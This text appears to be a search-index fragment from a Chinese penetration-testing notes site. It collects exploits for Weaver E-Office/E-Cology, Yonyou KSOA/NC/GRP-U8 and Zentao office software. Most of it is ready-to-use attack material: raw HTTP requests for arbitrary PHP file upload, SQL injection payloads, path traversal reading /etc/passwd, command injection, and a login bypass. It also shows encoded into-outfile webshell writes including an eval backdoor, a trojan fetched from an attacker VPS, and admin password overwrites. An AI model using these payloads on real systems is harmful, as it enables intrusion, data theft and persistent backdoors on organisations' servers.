\u4e2d\u5c0f\u578b\u4f01\u4e1aoa","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE/#e-office9","text":"Weaver E-Office9\u7248\u672c\u5b58\u5728\u4ee3\u7801\u95ee\u9898\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u6e90\u4e8e\u6587\u4ef6/inc/jquery/uploadify/uploadify.php\u5b58\u5728\u95ee\u9898\uff0c\u5bf9\u53c2\u6570Filedata\u7684\u64cd\u4f5c\u4f1a\u5bfc\u81f4\u4e0d\u53d7\u9650\u5236\u7684\u4e0a\u4f20\u3002 Weaver E-Office9.0 POC or EXP POST /inc/jquery/uploadify/uploadify.php HTTP/1.1 Host: 192.168.232.137:8082 User-Agent: test Connection: close Content-Length: 493 Accept-Encoding: gzip Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85 --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85 Content-Disposition: form-data; name=\"Filedata\"; filename=\"666.php\" Content-Type: application/octet-stream <?php phpinfo();?> --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85-- --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85 Content-Disposition: form-data; name=\"file\"; filename=\"\" Content-Type: application/octet-stream --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85-- \u6cdb\u5fae Weaver E-Office9 \u524d\u53f0\u6587\u4ef6\u5305\u542b POC http://URL/E-mobile/App/Init.php?weiApi=1\\&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin\\&m=12344554_../../attachment/xxx.xls","title":"e-office9 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE/#e-office9-cve-2023-2523-poc","text":"POST/Emobile/App/Ajax/ajax.php?action=mobile_upload_save HTTP/1.1 Host:192.168.233.10:8082 Cache-Control:max-age=0 Upgrade-Insecure-Requests:1 Origin:null Content-Type:multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt Accept-Encoding:gzip, deflate Accept-Language:en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7 Connection:close ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt Content-Disposition:form-data; name=\"upload_quwan\"; filename=\"1.php.\" Content-Type:image/jpeg <?phpphpinfo();?> ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt","title":"\u6cdb\u5faeE-Office9\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e CVE-2023-2523 POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE/#e-cology-sql-poc","text":"POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36 Connection: close Content-Length: 189 Content-Type: text/plain Accept-Encoding: gzip callCount=1 page= httpSessionId= scriptSessionId= c0-scriptName=DocDwrUtil c0-methodName=ifNewsCheckOutByCurrentUser c0-id=0 c0-param0=string:1 AND 1=1 c0-param1=string:1 batchId=0","title":"E-Cology \u67d0\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE/#showdocsimagesql","text":"GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=* HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) 5bGx5rW35LmL5YWz Accept-Encoding: gzip, deflate Connection: close","title":"\u6cdb\u5fae  ShowDocsImagesql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE/#weaver-e-office9","text":"http://URL/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls","title":"\u6cdb\u5fae Weaver E-Office9 \u524d\u53f0\u6587\u4ef6\u5305\u542b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/","text":"\u7528\u53cb \u76ee\u5f55 \u7528\u53cb\u65f6\u7a7aKSOA PayBill SQL\u6ce8\u5165\u6f0f\u6d1e POC \u79fb\u52a8\u7ba1\u7406\u7cfb \u7edf uploadApk.do \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u7528\u53cb\u65f6\u7a7a KSOA servletimagefield \u6587\u4ef6 sKeyvalue \u53c2\u6570SQL \u6ce8\u5165 \u7528\u53cb\u65f6\u7a7a KSOATaskRequestServlet sql\u6ce8\u5165\u6f0f\u6d1e \u7528\u53cb\u6587\u4ef6\u670d\u52a1\u5668\u8ba4\u8bc1\u7ed5\u8fc7 \u7528\u53cbGRP-U8\u5b58\u5728\u4fe1\u606f\u6cc4\u9732 \u6f0f\u6d1e\u7efc\u5408\u5229\u7528 \u7528\u53cb\u65f6\u7a7aKSOA PayBill SQL\u6ce8\u5165\u6f0f\u6d1e POC POST /servlet/PayBill?caculate&_rnd= HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 134 Accept-Encoding: gzip, deflate Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</name><name>102360</name></root> \u79fb\u52a8\u7ba1\u7406\u7cfb \u7edf uploadApk.do \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server Connection: close ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3 Content-Disposition:form-data;name=\"downloadpath\"; filename=\"a.jsp\" Content-Type: application/msword hello ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3-- \u7528\u53cb\u65f6\u7a7a KSOA servletimagefield \u6587\u4ef6 sKeyvalue \u53c2\u6570SQL \u6ce8\u5165 GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))- -+ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) 5bGx5rW35LmL5YWz Accept-Encoding: gzip, deflate Connection: \u7528\u53cb\u65f6\u7a7a KSOATaskRequestServlet sql\u6ce8\u5165\u6f0f\u6d1e /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1, \u7528\u53cb\u6587\u4ef6\u670d\u52a1\u5668\u8ba4\u8bc1\u7ed5\u8fc7 \u8d44\u4ea7\u641c\u7d22\uff1a app=\"\u7528\u53cb-NC-Cloud\" \u6216\u8005\u662fapp=\"\u7528\u53cb-NC-Cloud\" && server==\"Apache-Coyote/1.1\" POST\u6570\u636e\u5305\u4fee\u6539\u8fd4\u56de\u5305 false\u6539\u6210ture\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u767b\u9646 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Date: Thu, 10 Aug 2023 20:38:25 GMT Connection: close Content-Length: 17 {\"login\":\"false\"} \u7528\u53cbGRP-U8\u5b58\u5728\u4fe1\u606f\u6cc4\u9732 \u6f0f\u6d1e\u63cf\u8ff0\uff1a\u53cbU8\u7cfb\u7edf\u5b58\u53ef\u76f4\u63a5\u8bbf\u95eelog\u65e5\u5fd7\uff0c\u6cc4\u9732\u654f\u611f\u4fe1\u606f \u6279\u91cf\u626b\u63cf\u5de5\u5177: https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/\u7528\u53cbGRP-U8 GET /logs/info.log HTTP/1.1 \u6f0f\u6d1e\u7efc\u5408\u5229\u7528 https://github.com/wgpsec/YongYouNcTool","title":"\u7528\u53cb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/#_1","text":"","title":"\u7528\u53cb"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/#_2","text":"\u7528\u53cb\u65f6\u7a7aKSOA PayBill SQL\u6ce8\u5165\u6f0f\u6d1e POC \u79fb\u52a8\u7ba1\u7406\u7cfb \u7edf uploadApk.do \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u7528\u53cb\u65f6\u7a7a KSOA servletimagefield \u6587\u4ef6 sKeyvalue \u53c2\u6570SQL \u6ce8\u5165 \u7528\u53cb\u65f6\u7a7a KSOATaskRequestServlet sql\u6ce8\u5165\u6f0f\u6d1e \u7528\u53cb\u6587\u4ef6\u670d\u52a1\u5668\u8ba4\u8bc1\u7ed5\u8fc7 \u7528\u53cbGRP-U8\u5b58\u5728\u4fe1\u606f\u6cc4\u9732 \u6f0f\u6d1e\u7efc\u5408\u5229\u7528","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/#ksoa-paybill-sql-poc","text":"POST /servlet/PayBill?caculate&_rnd= HTTP/1.1 Host: 1.1.1.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Length: 134 Accept-Encoding: gzip, deflate Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><name>1</name><name>1'WAITFOR DELAY '00:00:03';-</name><name>1</name><name>102360</name></root>","title":"\u7528\u53cb\u65f6\u7a7aKSOA PayBill SQL\u6ce8\u5165\u6f0f\u6d1e POC"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/#uploadapkdo","text":"POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1 Host: Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server Connection: close ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3 Content-Disposition:form-data;name=\"downloadpath\"; filename=\"a.jsp\" Content-Type: application/msword hello ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--","title":"\u79fb\u52a8\u7ba1\u7406\u7cfb \u7edf uploadApk.do \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/#ksoa-servletimagefield-skeyvalue-sql","text":"GET /servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1'+union+select+sys.fn_varbintohexstr(hashbytes('md5','test'))- -+ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) 5bGx5rW35LmL5YWz Accept-Encoding: gzip, deflate Connection:","title":"\u7528\u53cb\u65f6\u7a7a KSOA servletimagefield \u6587\u4ef6 sKeyvalue \u53c2\u6570SQL \u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/#ksoataskrequestservlet-sql","text":"/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1,","title":"\u7528\u53cb\u65f6\u7a7a KSOATaskRequestServlet sql\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/#_3","text":"\u8d44\u4ea7\u641c\u7d22\uff1a app=\"\u7528\u53cb-NC-Cloud\" \u6216\u8005\u662fapp=\"\u7528\u53cb-NC-Cloud\" && server==\"Apache-Coyote/1.1\" POST\u6570\u636e\u5305\u4fee\u6539\u8fd4\u56de\u5305 false\u6539\u6210ture\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u767b\u9646 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Date: Thu, 10 Aug 2023 20:38:25 GMT Connection: close Content-Length: 17 {\"login\":\"false\"}","title":"\u7528\u53cb\u6587\u4ef6\u670d\u52a1\u5668\u8ba4\u8bc1\u7ed5\u8fc7"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/#grp-u8","text":"\u6f0f\u6d1e\u63cf\u8ff0\uff1a\u53cbU8\u7cfb\u7edf\u5b58\u53ef\u76f4\u63a5\u8bbf\u95eelog\u65e5\u5fd7\uff0c\u6cc4\u9732\u654f\u611f\u4fe1\u606f \u6279\u91cf\u626b\u63cf\u5de5\u5177: https://github.com/MzzdToT/HAC_Bored_Writing/tree/main/unauthorized/\u7528\u53cbGRP-U8 GET /logs/info.log HTTP/1.1","title":"\u7528\u53cbGRP-U8\u5b58\u5728\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/#_4","text":"https://github.com/wgpsec/YongYouNcTool","title":"\u6f0f\u6d1e\u7efc\u5408\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/","text":"\u7985\u9053 \u76ee\u5f55 \u63a2\u6d4b fofa \u67e5\u770b\u7248\u672c api\u770b F12\u770b\u7248\u672c \u5386\u53f2\u6f0f\u6d1e \u5f00\u6e90\u7248\u6d4b\u8bd5\u8d26\u53f7 18.0.beta1\u6743\u9650\u7ed5\u8fc7+\u547d\u4ee4\u6ce8\u5165rce \u7985\u905316.5 SQL\u6ce8\u5165\u6f0f\u6d1e 12.4.2\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 11.6\u540e\u53f0\u5b58\u50a8xss 11.6\u540e\u53f0sql\u6ce8\u5165 11.6 \u6587\u4ef6\u5305\u542b 11.6\u6587\u4ef6\u4e0a\u4f20+\u6587\u4ef6\u5305\u542b\u2192rce 12.4.2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6&\u4e0b\u8f7d pro\u4efb\u610f\u7248\u672c\u547d\u4ee4\u6267\u884c 8.2-9.2.1 \u4f4e\u7248\u672c\u524d\u53f0SQL\u6ce8\u5165\u5199shell \u540e\u6e17\u900f \u83b7\u53d6\u7ec4\u7ec7\u67b6\u6784 \u6570\u636e\u5e93\u4e2d\u7684\u8d26\u6237\u5bc6\u7801\u4f4d\u7f6e \u88c5\u63d2\u4ef6getshell \u7985\u9053\u662f\u4e00\u79cd\u5f00\u6e90\u7684\u9879\u76ee\u7ba1\u7406\u548c\u534f\u4f5c\u7cfb\u7edf\u3002\u5b83\u63d0\u4f9b\u4e86\u9879\u76ee\u7ba1\u7406\u3001\u4efb\u52a1\u7ba1\u7406\u3001\u7f3a\u9677\u8ddf\u8e2a\u3001\u6587\u6863\u7ba1\u7406\u3001\u56e2\u961f\u534f\u4f5c\u7b49\u529f\u80fd\uff0c\u53ef\u4ee5\u5e2e\u52a9\u56e2\u961f\u9ad8\u6548\u5730\u8fdb\u884c\u9879\u76ee\u7ba1\u7406\u548c\u534f\u4f5c\u3002 \u63a2\u6d4b fofa https://fofa.info/result?qbase64=YXBwPSLmmJPova%2FlpKnliJst56aF6YGT57O757ufIg%3D%3D \u67e5\u770b\u7248\u672c api\u770b http://127.0.0.1/zentao/index.php?mode=getconfig F12\u770b\u7248\u672c F12\u641c\u7d22 stylesheet \u5386\u53f2\u6f0f\u6d1e \u5f00\u6e90\u7248\u6d4b\u8bd5\u8d26\u53f7 \u5bc6\u7801\u5747\u4e3a123456 productManager projectManager dev1 dev2 dev3 tester1 tester2 tester3 testManager \u5f53\u4f7f\u7528\u8fd9\u4e9b\u8d26\u53f7\u521d\u6b21\u767b\u5f55\u7cfb\u7edf\u65f6\uff0c\u5f39\u51fa\u7684\u4fee\u6539\u5bc6\u7801\u9875\u9762\u53ef\u80fd\u6709bug\uff0c\u9700\u8981\u81ea\u884c\u4fee\u6539\uff1a\u70b9\u51fb \u53f3\u4fa7\u5934\u50cf-\u4fee\u6539\u5bc6\u7801 \uff0c\u4fee\u6539\u6210\u529f\uff0c\u5373\u53ef\u8fdb\u5165\u7cfb\u7edf 18.0.beta1\u6743\u9650\u7ed5\u8fc7+\u547d\u4ee4\u6ce8\u5165rce \u7985\u9053\u7cfb\u7edf \u5f71\u54cd\u7248\u672c \u5f00\u6e90\u7248 17.4\u4ee5\u4e0b\u7684\u672a\u77e5\u7248\u672c<=version<=18.0.beta1 \u65d7\u8230\u7248 3.4\u4ee5\u4e0b\u7684\u672a\u77e5\u7248\u672c<=version<=4.0.beta1 \u4f01\u4e1a\u7248 7.4\u4ee5\u4e0b\u7684\u672a\u77e5\u7248\u672c<=version<=8.0.beta1 8.0.beta2 https://github.com/0xf4n9x/Zentao-Captcha-RCE 1.exe -u url -c whoami \u7985\u905316.5 SQL\u6ce8\u5165\u6f0f\u6d1e \u62a5\u9519\u6ce8\u5165 POST /user-login.html HTTP/1.1 Host: 172.16.1.8 Content-Length: 189 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://172.16.1.8 Referer: http://172.16.1.8/user-login-Lw==.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: Connection: close account=aaa' and updatexml(1,concat(0x7e,(database()),0x7e),1) and '1'='1&password=b1663c937c5c84c38568ef381912c740&passwordStrength=0&referer=%2F&verifyRand=1090667403&keepLogin=0&captcha= 12.4.2\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u5148\u901a\u8fc7ftp\u5728\u81ea\u5df1vps\u4f20\u4e2a\u9a6c ftp://192.168.5.104/a.php \u7136\u540e\u628a\u8fd9\u4e2a\u94fe\u63a5base64\u52a0\u5bc6\uff0c\u653e\u5165\u4e0b\u9762\u8fd9\u4e2a\u94fe\u63a5\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20 http://127.0.0.1/zentao/client-download-1-(base64 encode webshelldownload link)-1.html \u7136\u540e\u8bbf\u95ee\u5373\u53ef http://127.0.0.1/zentao/data/client/1/a.php 11.6\u540e\u53f0\u5b58\u50a8xss 11.6\u540e\u53f0sql\u6ce8\u5165 http://www.0-sec.org/zentaopms_11.6/www/api-getModel-user-getRealNameAndEmails-users=admin http://www.0-sec.org/zentaopms_11.6/www/api-getModel-api-sql-sql=select+account,password+from+zt _user 11.6 \u6587\u4ef6\u5305\u542b http://www.0-sec.org/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd 11.6\u6587\u4ef6\u4e0a\u4f20+\u6587\u4ef6\u5305\u542b\u2192rce \u5199\u6587\u4ef6 POST /api-getModel-editor-save-filePath=/tmp/shell.php fileContent=<?php phpinfo();?> \u5305\u542b\u6587\u4ef6 http://127.0.0.1/api-getModel-api-getMethod-filePath=/tmp/shell/1 12.4.2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6&\u4e0b\u8f7d index.php?m=file&f=sendDownHeader&fileName=2&fileType=1&content=/etc/passwd&type=file index.php?m=file&f=sendDownHeader&fileName=2&fileType=1&content=./../../config/my.php&type=file index.php?m=im&f=downloadXxdPackage&xxdFileName=../../../../../../../../../etc/passwd pro\u4efb\u610f\u7248\u672c\u547d\u4ee4\u6267\u884c client\u53c2\u6570\u8fdb\u884c\u547d\u4ee4\u6267\u884c POST /repo-create.html SCM=Git&name=test2&path=C%3A%5CProgramData&encoding=utf-8&client=whoami 8.2-9.2.1 \u4f4e\u7248\u672c\u524d\u53f0SQL\u6ce8\u5165\u5199shell \u968f\u4fbf\u8f93\u8def\u7531\u4f1a\u7206\u7edd\u5bf9\u8def\u5f84 \u5982\u679c\u6ca1\u62a5\u9519\uff0c\u5c31\u7528\u8fd9\u4e2apayload {\"orderBy\":\"order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#\",\"num\":\"1,1\",\"type\":\"openedbyme\"} base64\u8f6c\u5316 eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= base64\u5b57\u7b26\u653e\u5165param\u53c2\u6570 http://127.0.0.1:81/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=base64 into outfile \u5199shell select '<?php phpinfo();?>' into outfile 'C:/Users/Administrator/Desktop/xampp/zentao/www/test.php' 73656c65637420273c3f70687020706870696e666f28293b3f3e2720696e746f206f757466696c652027433a2f55736572732f41646d696e6973747261746f722f4465736b746f702f78616d70702f7a656e74616f2f7777772f746573742e70687027 \u4e0a\u9762\u8fd9\u4e2a\u65b9\u6cd5\u5982\u679c\u4e0d\u80fd\u5199\uff0c\u53ef\u4ee5\u7528\u5982\u4e0b\u65b9\u5f0f\u5c1d\u8bd5bypass select '<?php @eval($_POST[x])?>' into outfile 'D:/zentao/xampp/zentao/www/hack.php' hex\u7f16\u7801\uff08\u6ce8\u610f\u52a0\u5bc6\u89e3\u5bc6\u90fd\u4e0d\u5e260x\uff0c\u4f46\u662fEXP\u4e2d\u9700\u8981\u52a0\u4e0a\uff09 73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027 payload\u539f\u578b {\"orderBy\":\"order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -\",\"num\":\"1,1\",\"type\":\"openedbyme\"} base64\u52a0\u5bc6 eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzQ0M0EyRjdBNjU2RTc0NjE2RjJGNzg2MTZENzA3MDJGN0E2NTZFNzQ2MTZGMkY3Nzc3NzcyRjY4NjE2MzZCMkU3MDY4NzAyNztQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== \u540e\u6e17\u900f \u83b7\u53d6\u7ec4\u7ec7\u67b6\u6784 ip/my-team.html \u6570\u636e\u5e93\u4e2d\u7684\u8d26\u6237\u5bc6\u7801\u4f4d\u7f6e zentao \u5e93\uff0c zt_user \u8868 password\u5b57\u6bb5\uff08\u88abmd5\u52a0\u5bc6\uff09\u548caccount\u5b57\u6bb5 \u6539\u7ba1\u7406\u5458\u5bc6\u7801\u8fdb\u884c\u767b\u5f55\uff0cpassword\u9700md5\u52a0\u5bc6 update zt_user SET password='10685fcd8e87988b0b02ac12d3f0ae88' where id=1; \u88c5\u63d2\u4ef6getshell \u540e\u53f0\u2192\u63d2\u4ef6\uff0cadmin\u624d\u80fd\u88c5\uff0c\u4f46\u662f\u53ef\u80fd\u70b9\u51fb\u63d2\u4ef6\u540e\uff0c\u63d0\u793a\u5fc5\u987b\u5728\u673a\u5668\u4e0a\u521b\u5efa\u4e00\u4e2a\u7279\u5b9a\u6587\u4ef6\u624d\u80fd\u88c5\u63d2\u4ef6\uff08\u9a8c\u8bc1admin\u8eab\u4efd\uff09\uff0c\u8fd9\u79cd\u60c5\u51b5\u5c31\u6ca1\u529e\u6cd5\u4e86 \u6709\u53ef\u80fd\u6709\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u7684\u63d2\u4ef6\u3002","title":"\u7985\u9053"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#_1","text":"","title":"\u7985\u9053"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93/#_2","text":"\u63a2\u6d4b fofa \u67e5\u770b\u7248\u672c api\u770b F12\u770b\u7248\u672c \u5386\u53f2\u6f0f\u6d1e \u5f00\u6e90\u7248\u6d4b\u8bd5\u8d26\u53f7 18.0.beta1\u6743\u9650\u7ed5\u8fc7+\u547d\u4ee4\u6ce8\u5165rce \u7985\u905316.5 SQL\u6ce8\u5165\u6f0f\u6d1e 12.4.2\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 11.6\u540e\u53f0\u5b58\u50a8xss 11.6\u540e\u53f0sql\u6ce8\u5165 11.6 \u6587\u4ef6\u5305\u542b 11.6\u6587\u4ef6\u4e0a\u4f20+\u6587\u4ef6\u5305\u542b\u2192rce 12.4.2 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6&\u4e0b\u8f7d pro\u4efb\u610f\u7248\u672c\u547d\u4ee4\u6267\u884c 8.2-9.2.1 \u4f4e\u7248\u672c\u524d\u53f0SQL\u6ce8\u5165\u5199shell \u540e\u6e17\u900f \u83b7\u53d6\u7ec4\u7ec7\u67b6\u6784 \u6570\u636e\u5e93\u4e2d\u7684\u8d26\u6237\u5bc6\u7801\u4f4d\u7f6e \u88c5\u63d2\u4ef6getshell 